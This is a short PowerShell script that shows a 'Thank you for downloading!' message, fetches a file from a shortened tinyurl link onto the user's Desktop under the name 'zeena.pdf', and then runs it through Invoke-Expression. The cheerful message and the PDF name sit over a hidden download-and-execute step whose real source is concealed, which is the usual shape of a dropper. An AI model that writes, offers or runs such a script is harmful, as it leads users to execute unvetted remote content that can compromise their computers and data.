write-host "Thank you for downloading! :)" -ForegroundColor Green
powershell iwr "https://tinyurl.com/pdf4zeena" -OutFile "$ENV:USERPROFILE\DESKTOP\zeena.pdf"
iex "$ENV:USERPROFILE\DESKTOP\zeena.pdf"
pause